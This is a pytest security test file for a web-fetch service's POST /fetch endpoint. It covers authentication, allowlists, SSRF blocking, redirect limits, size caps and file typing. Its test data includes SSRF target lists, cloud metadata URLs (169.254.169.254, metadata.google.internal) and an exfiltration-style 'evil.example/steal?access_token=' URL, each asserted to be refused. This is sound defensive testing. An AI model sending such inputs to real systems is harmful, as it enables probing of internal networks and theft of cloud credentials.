"""LW-08 tilo-browser POST /fetch acceptance and security tests (PRD 12.3, 16.2, SEC-09, FR-INT-01, BQ-LW-1/5, BQ-104).

Covers every AGY-BE-7 (LW-09) sandbox-web fixture and security requirement:
- Service-to-service authentication only (401/403 on anonymous, bad token, or wrong caller; never 500).
- HTTPS GET only (http allowed only for the configured sandbox-web test host); no cookies or auth headers forwarded.
- Allowed hosts: EgressPolicy + per-task allowlist in the request (logged on every block).
- SSRF: custom DNS resolution; refuses loopback (127.0.0.1, ::1), RFC1918 private, CGNAT (100.64.0.0/10),
  link-local (169.254.0.0/16, fe80::/10), cloud metadata (169.254.169.254, metadata.google.internal),
  IPv6 ULA (fc00::/7), and IPv6-mapped private addresses (::ffff:127.0.0.1, ::ffff:10.0.0.1, etc.).
- Pins the resolved IP for the connection and re-checks every redirect hop (max 5).
- Honours robots.txt and caches it per host. Connect and read timeouts enforced.
- Streams with a 25 MiB per-file cap and 10 files / 50 MB per-unit cap (FR-INT-01).
- Types by magic bytes (extraction.FILE_TYPES), never by extension or Content-Type; refuses archives and executables;
  converts HTML to plain text with <script>/<style> removed.
- Returns {sha256, media_type, size, source_url (BQ-104), publisher_host, fetched_at} and archives raw bytes.
- Logs every block with a reason (SEC-09) and never logs bodies, userinfo, or query strings.
"""

from __future__ import annotations

import hashlib
import io
import json
import logging
import socket
import zipfile
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest
from _browser_lib import fake_secrets
from fastapi.testclient import TestClient
from tilo_archive import LocalDirStore, verify_chain
from tilo_sandbox_web.app import app as sandbox_app
from tilo_sandbox_web.fetch_fixtures import PAPERS, WRONG_MAGIC_PNG

SANDBOX_HOST = "sandbox.tilo.test"
SANDBOX_IP = "93.184.216.34"
SERVICE_CALLER = "tilo-harness@tilo-dev.iam.gserviceaccount.com"
AUDIENCE = "https://tilo-browser.run.app"
VALID_TOKEN = "valid-harness-oidc-token"
FIXED_NOW = datetime(2026, 10, 8, 9, 30, 0, tzinfo=UTC)


@dataclass
class RecordedHop:
    method: str
    scheme: str
    host: str
    port: int
    pinned_ip: str
    path_and_query: str
    headers: dict[str, str]
    connect_timeout: float
    read_timeout: float


class SandboxTransport:
    """In-process transport backed by `tilo_sandbox_web.app` plus programmable extra routes for edge cases."""

    def __init__(self) -> None:
        self.client = TestClient(sandbox_app)
        self.hops: list[RecordedHop] = []
        self.extra_routes: dict[tuple[str, str], tuple[int, dict[str, str], bytes]] = {}
        self.fail_with: Exception | None = None

    def send_get(
        self,
        *,
        scheme: str,
        host: str,
        port: int,
        pinned_ip: str,
        path_and_query: str,
        headers: dict[str, str],
        connect_timeout: float,
        read_timeout: float,
        max_bytes: int,
    ):
        from tilo_browser.fetch import FetchBlocked, UpstreamResponse

        self.hops.append(
            RecordedHop(
                method="GET",
                scheme=scheme,
                host=host,
                port=port,
                pinned_ip=pinned_ip,
                path_and_query=path_and_query,
                headers={k.lower(): v for k, v in headers.items()},
                connect_timeout=connect_timeout,
                read_timeout=read_timeout,
            )
        )
        if self.fail_with is not None:
            raise self.fail_with

        path_only = path_and_query.split("?", 1)[0]
        custom = self.extra_routes.get((host, path_and_query)) or self.extra_routes.get((host, path_only))
        if custom is not None:
            status, resp_headers, payload = custom
            if len(payload) > max_bytes:
                raise FetchBlocked("file_too_large", f"{scheme}://{host}{path_and_query}", host=host)
            return UpstreamResponse(
                status_code=status,
                headers={k.lower(): v for k, v in resp_headers.items()},
                body=payload,
            )

        with self.client.stream("GET", path_and_query, follow_redirects=False) as resp:
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            cl = resp_headers.get("content-length")
            if cl and cl.isdigit() and int(cl) > max_bytes:
                raise FetchBlocked("file_too_large", f"{scheme}://{host}{path_and_query}", host=host)
            buf = bytearray()
            for chunk in resp.iter_bytes(chunk_size=65536):
                buf.extend(chunk)
                if len(buf) > max_bytes:
                    raise FetchBlocked("file_too_large", f"{scheme}://{host}{path_and_query}", host=host)
            return UpstreamResponse(status_code=resp.status_code, headers=resp_headers, body=bytes(buf))


@dataclass
class FetchRig:
    client: TestClient
    service: Any
    transport: SandboxTransport
    archive_dir: Path
    dns_map: dict[str, list[str]] = field(default_factory=dict)

    def post_fetch(self, payload: dict[str, Any], *, token: str | None = VALID_TOKEN):
        headers = {"Authorization": f"Bearer {token}"} if token is not None else {}
        return self.client.post("/fetch", json=payload, headers=headers)


@pytest.fixture()
def rig(tmp_path: Path) -> FetchRig:
    from tilo_browser.app import create_app
    from tilo_browser.fetch import FetchService, RawArchiveStore

    dns_map: dict[str, list[str]] = {
        SANDBOX_HOST: [SANDBOX_IP],
        "docs.allowed.example": ["93.184.216.34"],
        "loopback.evil.example": ["127.0.0.1"],
        "ipv6loop.evil.example": ["::1"],
        "private10.evil.example": ["10.0.0.42"],
        "private172.evil.example": ["172.16.5.4"],
        "private192.evil.example": ["192.168.1.10"],
        "cgnat.evil.example": ["100.64.0.1"],
        "linklocal.evil.example": ["169.254.10.20"],
        "metadata-ip.evil.example": ["169.254.169.254"],
        "ula.evil.example": ["fd12:3456:789a::1"],
        "fe80.evil.example": ["fe80::1"],
        "mapped-loop.evil.example": ["::ffff:127.0.0.1"],
        "mapped-priv.evil.example": ["::ffff:10.0.0.1"],
        "mapped-meta.evil.example": ["::ffff:169.254.169.254"],
        "mapped-cgnat.evil.example": ["::ffff:100.64.0.1"],
        "nat64-loop.evil.example": ["64:ff9b::127.0.0.1"],
        "mixed.evil.example": ["93.184.216.34", "127.0.0.1"],
    }

    def resolve(host: str, port: int) -> list[str]:
        if host not in dns_map:
            raise socket.gaierror(f"unknown host {host}")
        return list(dns_map[host])

    transport = SandboxTransport()
    archive_dir = tmp_path / "archive"
    archive_store = RawArchiveStore(archive_dir)
    service = FetchService(
        base_allow=(),
        sandbox_hosts=(SANDBOX_HOST,),
        dns_resolver=resolve,
        transport=transport,
        archive_store=archive_store,
        clock=lambda: FIXED_NOW,
    )

    def verify_oidc(token: str, audience: str) -> dict[str, Any]:
        if token == VALID_TOKEN:
            return {
                "iss": "https://accounts.google.com",
                "aud": audience,
                "email": SERVICE_CALLER,
                "email_verified": True,
            }
        if token == "wrong-caller-token":
            return {
                "iss": "https://accounts.google.com",
                "aud": audience,
                "email": "stranger@tilo-dev.iam.gserviceaccount.com",
                "email_verified": True,
            }
        raise ValueError("invalid token")

    app = create_app(
        fetch_service=service,
        oidc_verifier=verify_oidc,
        audience=AUDIENCE,
        allowed_callers=(SERVICE_CALLER,),
    )
    return FetchRig(
        client=TestClient(app),
        service=service,
        transport=transport,
        archive_dir=archive_dir,
        dns_map=dns_map,
    )


def test_LW_08_service_to_service_auth_refuses_anonymous_bad_token_and_wrong_caller(rig: FetchRig) -> None:
    from tilo_browser.app import app as default_app

    # Default unconfigured app refuses anonymous with 401 and bearer token with 403
    unconfigured = TestClient(default_app)
    assert unconfigured.post("/fetch", json={"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"}).status_code == 401
    assert (
        unconfigured.post(
            "/fetch",
            json={"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"},
            headers={"Authorization": f"Bearer {VALID_TOKEN}"},
        ).status_code
        == 403
    )

    # Configured app refuses missing, non-Bearer, invalid, and wrong-caller tokens
    assert rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"}, token=None).status_code == 401
    assert (
        rig.client.post(
            "/fetch",
            json={"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"},
            headers={"Authorization": "Basic dXNlcjpwdw=="},
        ).status_code
        == 401
    )
    assert rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"}, token="forged").status_code == 401
    assert (
        rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf"}, token="wrong-caller-token").status_code
        == 403
    )


@pytest.mark.parametrize("filename", ["paper-1.pdf", "paper-2.pdf", "paper-3.pdf", "answer-key.pdf"])
def test_LW_08_past_papers_and_answer_key_fetched_cleaned_and_archived(rig: FetchRig, filename: str) -> None:
    raw_url = f"http://{SANDBOX_HOST}/papers/{filename};jsessionid=123?utm_source=search#page=1"
    resp = rig.post_fetch(
        {
            "url": raw_url,
            "allow_hosts": [SANDBOX_HOST],
            "org_id": "org_test1",
            "run_id": "r_run1",
            "unit_id": "U1",
        }
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    expected_bytes = PAPERS[filename]
    expected_sha = hashlib.sha256(expected_bytes).hexdigest()

    assert data["sha256"] == expected_sha
    assert data["media_type"] == "application/pdf"
    assert data["size"] == len(expected_bytes)
    assert data["source_url"] == f"http://{SANDBOX_HOST}/papers/{filename}"
    assert data["publisher_host"] == SANDBOX_HOST
    assert data["fetched_at"] == "2026-10-08T09:30:00.000Z"

    # Raw bytes stored in archive store and hash-chained tool_call record written
    assert rig.service.archive_store.get_bytes("org_test1", "r_run1", expected_sha) == expected_bytes
    lines = LocalDirStore(rig.archive_dir).read_lines("org_test1", "r_run1")
    records = [json.loads(line) for line in lines]
    assert verify_chain(records) == []
    assert records[-1]["kind"] == "tool_call"
    assert records[-1]["payload"]["source"] == {"kind": "web", "ref": f"http://{SANDBOX_HOST}/papers/{filename}"}
    assert records[-1]["payload"]["sha256"] == expected_sha


def test_LW_08_https_only_except_sandbox_host_and_no_cookies_or_auth_forwarded(rig: FetchRig) -> None:
    # HTTP to a non-sandbox host is refused even if allowlisted
    http_resp = rig.post_fetch(
        {"url": "http://docs.allowed.example/papers/paper-1.pdf", "allow_hosts": ["docs.allowed.example"]}
    )
    assert http_resp.status_code == 403
    assert http_resp.json()["reason"] == "scheme_not_allowed"
    assert rig.transport.hops == []

    # Set-Cookie from upstream is never stored or re-sent, and Authorization is never forwarded
    rig.transport.extra_routes[(SANDBOX_HOST, "/robots.txt")] = (
        200,
        {"content-type": "text/plain", "set-cookie": "session=supersecret"},
        b"User-agent: *\nAllow: /\n",
    )
    ok = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert ok.status_code == 200
    assert len(rig.transport.hops) == 2  # /robots.txt then /papers/paper-1.pdf
    for hop in rig.transport.hops:
        assert "authorization" not in hop.headers
        assert "cookie" not in hop.headers
        assert hop.pinned_ip == SANDBOX_IP


def test_LW_08_non_allowlisted_host_is_refused_logged_and_never_connected(
    rig: FetchRig, caplog: pytest.LogCaptureFixture
) -> None:
    with caplog.at_level(logging.WARNING, logger="tilo_browser.fetch"):
        resp = rig.post_fetch({"url": "https://unlisted.example/papers/paper-1.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 403
    assert resp.json()["reason"] == "host_not_allowlisted"
    assert rig.transport.hops == []
    assert any("host_not_allowlisted" in r.getMessage() for r in caplog.records)


@pytest.mark.parametrize(
    "host",
    [
        "loopback.evil.example",
        "ipv6loop.evil.example",
        "private10.evil.example",
        "private172.evil.example",
        "private192.evil.example",
        "cgnat.evil.example",
        "linklocal.evil.example",
        "metadata-ip.evil.example",
        "ula.evil.example",
        "fe80.evil.example",
        "mapped-loop.evil.example",
        "mapped-priv.evil.example",
        "mapped-meta.evil.example",
        "mapped-cgnat.evil.example",
        "nat64-loop.evil.example",
        "mixed.evil.example",
    ],
)
def test_LW_08_ssrf_dns_resolving_to_private_loopback_cgnat_link_local_ula_or_ipv6_mapped_is_refused(
    rig: FetchRig, host: str
) -> None:
    resp = rig.post_fetch({"url": f"https://{host}/papers/paper-1.pdf", "allow_hosts": [host]})
    assert resp.status_code == 403
    assert resp.json()["reason"] == "ssrf_blocked"
    assert rig.transport.hops == []
    assert rig.service.blocked[-1].reason == "ssrf_blocked"


@pytest.mark.parametrize(
    "url",
    [
        "https://169.254.169.254/latest/meta-data/",
        "https://127.0.0.1/papers/paper-1.pdf",
        "https://[::ffff:127.0.0.1]/papers/paper-1.pdf",
        "https://metadata.google.internal/computeMetadata/v1/",
        "https://sub.metadata.google.internal/computeMetadata/v1/",
        "https://localhost/papers/paper-1.pdf",
    ],
)
def test_LW_08_ssrf_ip_literals_and_metadata_google_internal_are_refused(rig: FetchRig, url: str) -> None:
    resp = rig.post_fetch({"url": url, "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 403
    assert resp.json()["reason"] in {"ip_literal", "ssrf_blocked", "host_not_allowlisted", "invalid_url"}
    assert rig.transport.hops == []


def test_LW_08_redirect_to_169_254_169_254_is_refused_and_never_connected(rig: FetchRig) -> None:
    resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/redirect-ssrf", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 403
    assert resp.json()["reason"] in {"ip_literal", "ssrf_blocked", "scheme_not_allowed"}
    # Only robots.txt, /papers/redirect-ssrf, and /papers/redirect-ssrf-hop hit sandbox; never 169.254.169.254
    assert [h.path_and_query for h in rig.transport.hops] == [
        "/robots.txt",
        "/papers/redirect-ssrf",
        "/papers/redirect-ssrf-hop",
    ]
    assert all(h.host == SANDBOX_HOST and h.pinned_ip == SANDBOX_IP for h in rig.transport.hops)


def test_LW_08_redirect_to_dns_host_resolving_to_loopback_is_refused_on_hop(rig: FetchRig) -> None:
    rig.transport.extra_routes[(SANDBOX_HOST, "/papers/hop-to-rebind")] = (
        302,
        {"location": "https://loopback.evil.example/secret"},
        b"",
    )
    resp = rig.post_fetch(
        {
            "url": f"http://{SANDBOX_HOST}/papers/hop-to-rebind",
            "allow_hosts": [SANDBOX_HOST, "loopback.evil.example"],
        }
    )
    assert resp.status_code == 403
    assert resp.json()["reason"] == "ssrf_blocked"
    assert all(h.host == SANDBOX_HOST for h in rig.transport.hops)


def test_LW_08_too_many_redirects_refused_after_max_5_hops(rig: FetchRig) -> None:
    resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/redirect-loop/0", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 403
    assert resp.json()["reason"] == "too_many_redirects"
    # robots.txt + initial request (hop 0) + 5 redirect hops (hops 1..5) = 7 requests total, then aborted
    paper_hops = [h.path_and_query for h in rig.transport.hops if h.path_and_query != "/robots.txt"]
    assert len(paper_hops) == 6


def test_LW_08_robots_disallowed_path_is_refused_and_robots_txt_is_cached_per_host(rig: FetchRig) -> None:
    disallowed = rig.post_fetch(
        {"url": f"http://{SANDBOX_HOST}/private/secret-paper.pdf", "allow_hosts": [SANDBOX_HOST]}
    )
    assert disallowed.status_code == 403
    assert disallowed.json()["reason"] == "robots_disallowed"
    assert [h.path_and_query for h in rig.transport.hops] == ["/robots.txt"]

    # Subsequent allowed fetches on the same host reuse the cached robots.txt
    for name in ("paper-1.pdf", "paper-2.pdf"):
        ok = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/{name}", "allow_hosts": [SANDBOX_HOST]})
        assert ok.status_code == 200
    robots_fetches = [h for h in rig.transport.hops if h.path_and_query == "/robots.txt"]
    assert len(robots_fetches) == 1


def test_LW_08_oversize_file_above_25_mib_is_refused(rig: FetchRig) -> None:
    resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/oversize.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 413
    assert resp.json()["reason"] == "file_too_large"
    assert rig.service.blocked[-1].reason == "file_too_large"


def test_LW_08_per_unit_10_files_and_50_mb_limits_enforced(rig: FetchRig) -> None:
    # 10 files allowed for unit U1, 11th refused
    for i in range(10):
        ok = rig.post_fetch(
            {
                "url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf?req={i}",
                "allow_hosts": [SANDBOX_HOST],
                "run_id": "r_cap_files",
                "unit_id": "U1",
            }
        )
        assert ok.status_code == 200, f"file {i} failed: {ok.text}"

    eleventh = rig.post_fetch(
        {
            "url": f"http://{SANDBOX_HOST}/papers/paper-2.pdf",
            "allow_hosts": [SANDBOX_HOST],
            "run_id": "r_cap_files",
            "unit_id": "U1",
        }
    )
    assert eleventh.status_code == 413
    assert eleventh.json()["reason"] == "unit_file_limit"

    # 50 MB per-unit byte cap: 2 x 20 MiB files succeed (40 MiB), 3rd 20 MiB file exceeds 50,000,000 bytes
    twenty_mib_pdf = b"%PDF-1.4\n" + b"A" * (20 * 1024 * 1024) + b"\n%%EOF\n"
    rig.transport.extra_routes[(SANDBOX_HOST, "/papers/twenty-mib.pdf")] = (
        200,
        {"content-type": "application/pdf"},
        twenty_mib_pdf,
    )
    for i in range(2):
        ok = rig.post_fetch(
            {
                "url": f"http://{SANDBOX_HOST}/papers/twenty-mib.pdf?part={i}",
                "allow_hosts": [SANDBOX_HOST],
                "run_id": "r_cap_bytes",
                "unit_id": "U2",
            }
        )
        assert ok.status_code == 200
    third = rig.post_fetch(
        {
            "url": f"http://{SANDBOX_HOST}/papers/twenty-mib.pdf?part=2",
            "allow_hosts": [SANDBOX_HOST],
            "run_id": "r_cap_bytes",
            "unit_id": "U2",
        }
    )
    assert third.status_code == 413
    assert third.json()["reason"] == "unit_byte_limit"


def test_LW_08_wrong_magic_bytes_typed_by_magic_and_unrecognized_magic_refused(rig: FetchRig) -> None:
    # /papers/wrong-magic.pdf has .pdf extension and Content-Type: application/pdf, but PNG magic bytes
    resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/wrong-magic.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 200
    data = resp.json()
    assert data["media_type"] == "image/png"
    assert data["sha256"] == hashlib.sha256(WRONG_MAGIC_PNG).hexdigest()

    # Corrupt/fake magic bytes claiming to be application/pdf are refused
    rig.transport.extra_routes[(SANDBOX_HOST, "/papers/fake-bytes.pdf")] = (
        200,
        {"content-type": "application/pdf"},
        b"NOT_A_REAL_PDF_OR_IMAGE_HEADER",
    )
    bad = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/fake-bytes.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert bad.status_code == 415
    assert bad.json()["reason"] == "unsupported_media_type"


def test_LW_08_zip_archive_and_executables_refused_while_valid_ooxml_accepted(rig: FetchRig) -> None:
    # Bare .zip fixture from AGY-BE-7 is refused
    zip_resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/archive.zip", "allow_hosts": [SANDBOX_HOST]})
    assert zip_resp.status_code == 415
    assert zip_resp.json()["reason"] == "archive_refused"

    # Executable binaries (PE MZ and ELF) are refused even if served under /papers/*.pdf
    for slug, payload in (("pe.pdf", b"MZ\x90\x00\x03\x00\x00\x00"), ("elf.pdf", b"\x7fELF\x02\x01\x01\x00")):
        rig.transport.extra_routes[(SANDBOX_HOST, f"/papers/{slug}")] = (
            200,
            {"content-type": "application/pdf"},
            payload,
        )
        exe_resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/{slug}", "allow_hosts": [SANDBOX_HOST]})
        assert exe_resp.status_code == 415
        assert exe_resp.json()["reason"] == "executable_refused"

    # A valid DOCX (ZIP container with [Content_Types].xml and word/document.xml) is typed as DOCX
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types/>')
        zf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document><w:t>Hi</w:t></w:document>')
    docx_bytes = buf.getvalue()
    rig.transport.extra_routes[(SANDBOX_HOST, "/papers/syllabus.bin")] = (
        200,
        {"content-type": "application/octet-stream"},
        docx_bytes,
    )
    docx_resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/syllabus.bin", "allow_hosts": [SANDBOX_HOST]})
    assert docx_resp.status_code == 200
    assert docx_resp.json()["media_type"] == "application/vnd.openxmlformats-officedocument.wordprocessingml.document"


def test_LW_08_html_page_becomes_plain_text_with_scripts_removed_and_injected_pdf_stored_safely(
    rig: FetchRig,
) -> None:
    html_resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/study-guide.html", "allow_hosts": [SANDBOX_HOST]})
    assert html_resp.status_code == 200
    html_data = html_resp.json()
    assert html_data["media_type"] == "text/plain"
    stored_text = rig.service.archive_store.get_bytes("org_local", "r_local", html_data["sha256"]).decode("utf-8")
    assert "Northbridge Fictional Academy Study Guide" in stored_text
    assert "Review Past Papers 1, 2, and 3" in stored_text
    assert "__northbridgeTelemetry" not in stored_text
    assert "<script" not in stored_text.lower()

    # Injected PDF is stored as raw bytes without executing anything
    inj_resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/injected.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert inj_resp.status_code == 200
    assert inj_resp.json()["media_type"] == "application/pdf"
    assert inj_resp.json()["sha256"] == hashlib.sha256(PAPERS["injected.pdf"]).hexdigest()


def test_LW_08_logs_every_block_with_reason_and_never_logs_bodies_or_query_tokens(
    rig: FetchRig, caplog: pytest.LogCaptureFixture
) -> None:
    secrets = fake_secrets()
    token_q = secrets["kv_token"]
    api_k = secrets["api_key"]
    pw = secrets["password"]

    with caplog.at_level(logging.INFO):
        r1 = rig.post_fetch(
            {"url": f"https://evil.example/steal?access_token={token_q}&key={api_k}", "allow_hosts": [SANDBOX_HOST]}
        )
        r2 = rig.post_fetch(
            {"url": f"http://user:{pw}@{SANDBOX_HOST}/papers/paper-1.pdf", "allow_hosts": [SANDBOX_HOST]}
        )
        r3 = rig.post_fetch(
            {"url": f"http://{SANDBOX_HOST}/papers/study-guide.html?token={token_q}", "allow_hosts": [SANDBOX_HOST]}
        )

    assert r1.status_code == 403
    assert r2.status_code == 403
    assert r3.status_code == 403  # sensitive_query blocked by EgressPolicy

    combined = "\n".join(
        [r1.text, r2.text, r3.text, *(rec.getMessage() for rec in caplog.records), repr(rig.service.blocked)]
    )
    for secret in (token_q, api_k, pw, "Northbridge Fictional Academy Study Guide"):
        assert secret not in combined


def test_LW_08_timeouts_and_pinned_http_transport_pin_ip_and_tls_server_hostname(
    rig: FetchRig, monkeypatch: pytest.MonkeyPatch
) -> None:
    from tilo_browser.fetch import PinnedHttpTransport

    rig.transport.fail_with = TimeoutError("read timed out")
    resp = rig.post_fetch({"url": f"http://{SANDBOX_HOST}/papers/paper-1.pdf", "allow_hosts": [SANDBOX_HOST]})
    assert resp.status_code == 504
    assert resp.json()["reason"] == "timeout"

    # Direct unit test of PinnedHttpTransport socket pinning + TLS SNI hostname
    connected: list[tuple[tuple[str, int], float | None, str | None]] = []

    class FakeSocket:
        def __init__(self) -> None:
            self.timeout: float | None = None
            self.sent = bytearray()

        def settimeout(self, value: float | None) -> None:
            self.timeout = value

        def sendall(self, data: bytes) -> None:
            self.sent.extend(data)

        def makefile(self, mode: str, *args: Any, **kwargs: Any) -> io.BytesIO:
            return io.BytesIO(
                b"HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\nContent-Length: 9\r\n\r\n%PDF-1.4\n"
            )

        def close(self) -> None:
            pass

    fake_sock = FakeSocket()

    def fake_create_connection(address: tuple[str, int], timeout: float | None = None, *_a: Any, **_kw: Any):
        connected.append((address, timeout, None))
        return fake_sock

    class FakeSSLContext:
        def wrap_socket(self, sock: Any, *, server_hostname: str | None = None):
            connected[-1] = (connected[-1][0], connected[-1][1], server_hostname)
            return sock

    monkeypatch.setattr(socket, "create_connection", fake_create_connection)
    monkeypatch.setattr("ssl.create_default_context", lambda: FakeSSLContext())

    real_transport = PinnedHttpTransport()
    out = real_transport.send_get(
        scheme="https",
        host="docs.allowed.example",
        port=443,
        pinned_ip="93.184.216.34",
        path_and_query="/papers/paper-1.pdf",
        headers={"Authorization": "Bearer must-be-stripped", "Cookie": "sid=must-be-stripped"},
        connect_timeout=3.5,
        read_timeout=7.5,
        max_bytes=1024,
    )
    assert out.status_code == 200
    assert out.body == b"%PDF-1.4\n"
    assert connected == [(("93.184.216.34", 443), 3.5, "docs.allowed.example")]
    sent_Wire = fake_sock.sent.decode("latin-1").lower()
    assert "host: docs.allowed.example\r\n" in sent_Wire
    assert "authorization" not in sent_Wire
    assert "cookie" not in sent_Wire
